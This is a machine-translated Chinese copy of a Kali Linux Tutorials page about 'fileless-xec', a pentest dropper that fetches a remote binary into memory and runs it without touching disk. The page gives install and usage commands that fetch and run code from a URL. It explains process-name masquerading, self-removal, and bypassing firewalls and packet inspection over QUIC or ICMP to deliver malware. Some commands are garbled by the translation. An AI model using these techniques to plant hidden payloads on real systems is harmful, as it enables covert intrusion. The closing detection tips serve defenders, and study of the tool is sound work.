# 执行远程二进制文件而不把它们放到磁盘上

> 原文：<https://kalilinuxtutorials.com/fileless-xec/>

[![](img/9292b7a5acd3aa3f52954e82a37a9d55.png)](https://blogger.googleusercontent.com/img/a/AVvXsEg1m-Vylnb0A_Yx1JWmDXKb7WkdwK7zmA8NmnJKV60kFCbw_MLFxlBve_oLdhcUTVyIr9OSfO_LvISnVhg9gI8SL9i2CXkC5TBW8MMuvHIEPj2giAjl4fpWws3qQJraL6t0JkOibns5jXvuSrvRA55AfFEJOkOeZ_50gT0VS1UAeqht49Jw5rTYm8QR=s909)

Fileless-Xec 是一个秘密的下载程序，它执行远程二进制文件，而不把它们放到磁盘上

***Pentest 用途:*** `**fileless-xec**`用于在目标机器上秘密执行位于攻击者机器上的二进制文件

**短篇小说**

使我们能够直接从内存中在本地机器上执行远程二进制文件，而无需将它们放到磁盘上

**安装**

**从发布**

*Linux:*

**curl-lO-L https://github . com/ariary/file less-xec/releases/latest/download/file less-xec**

*视窗:*

**curl-lO-L https://github . com/ariary/file less-xec/releases/latest/download/file less-xec _ windows . exe**

**来源于**

克隆存储库并在本地下载依赖项:

**git 克隆 https://github.com/ariary/fileless-xec.git
CD 无文件-xec
make before.build**

为 linux 构建无文件 xec

**build.fileless-xec**

为 windows 构建无文件 xec

**windows . build . file less-xec**

**用`go`命令**

确保`**$GOPATH**`在你的`**$PATH**`之前

安装`**fileless-xec**`

**去安装 github.com/ariary/fileless-xec/cmd/fileless-xec**

**解释**

我们希望在本地执行位于远程机器上的`**writeNsleep**`二进制文件。

我们首先在 remote 上启动一个 python http 服务器。在本地，我们使用`**fileless-xe**c`并模拟`**/usr/sbin/sshd**`的名字来执行二进制代码`**writeNsleep**`(为了偷瘦&的乐趣)。一旦 write N sleep 开始，fileless-xec 将删除自身(`**--self-remove**`)

**其他用例**

*   使用 stdout/stdin 执行二进制文件
*   执行带参数的二进制
*   `fileless-xec`自我清除
*   使用 ICMP 绕过网络限制
*   使用 HTTP3 绕过防火墙
*   “远程 go”:在本地没有安装 go 的情况下执行 go 二进制文件
*   执行外壳脚本
*   `**fileless-xec**`服务器模式
    *   RAT(远程访问特洛伊木马)场景
*   `**fileless-xec**`在 windows 上

**偷情故事**

*   二进制文件不会映射到主机文件系统中
*   执行程序名称可以是可定制的
*   可以通过 http3 支持绕过第三代防火墙
*   `**fileless-xec**`一旦启动，自我移除

**memfd_create**

远程二进制文件使用`**memfd_create**` syscall 存储在本地，syscall 将它存储在一个*内存磁盘*中，这个磁盘没有映射到文件系统中(*即*你无法使用`**ls**`找到它)。

**fexecve**

然后我们使用`**fexecve**` syscall 执行它(因为目前`**syscall**` golang 库没有提供它，所以我们实现了它)。

使用`fexecve`我们可以执行一个程序，但是我们使用文件描述符而不是完整路径来引用程序运行。

**HTTP3/QUIC**

| 用 **`-Q` / `http3`** 标志使能。
通过运行`**go run ./test/http3/light-server.go -p LISTENING PORT**`(这是相当于`**python3 -m http.server **`的 http3)可以设置一个支持 http3 的轻量级 web rootfs 服务器
使用`**test/http3/genkey.sh**`生成证书和密钥。 |

`**QUIC**` UDP 又名 **`http3`** 是新一代互联网协议，用于加速易受延迟影响的在线网络应用，如搜索、视频流等。，通过减少连接到服务器所需的往返时间(RTT)。

由于 QUIC 使用等同于 TLS 的专有加密(这将在未来的标准化版本中有所改变)，提供应用程序控制和可见性的第三代防火墙在控制和监控 QUIC 流量方面遇到了困难。

如果你实际上使用`**fileless-xec**`作为一个丢弃器( ***仅用于测试目的或经授权*** )，你很可能想执行某种恶意软件或其他可能被数据包分析丢弃的文件。因此，有了 Quic，你就可以**绕过数据包分析，获得恶意软件**。

此外，如果防火墙仅用于允许/阻止流量，可能会发生**防火墙规则忘记了 udp 协议，从而使您的请求不被发现**

**其他潜行技能**

虽然不存在于内存磁盘上，但仍可使用`ps`命令检测到正在运行的程序。

1.  用一个假的程序名掩盖痕迹

`**fileless-xec --name <fake_name> <binary_raw_url>**`默认名称为`**[kworker/u:0]**`

2.  从 tty 分离以映射守护进程的行为

`**setsid fileless-xec <binary_raw_url>**`。*从代码*调用 WIP`**setsid**`

**告诫**

你仍然会被检测到:

**$ lsof | grep memfd**

或者也是`**opensnoop**`(但不是由`**execsnoop**`)

或者 sec comp profile auditing`**execve**`syscall(但是这是一个非常难以控制的命令，因为`**sleep**`命令也使用 execve)

[**Download**](https://github.com/ariary/fileless-xec)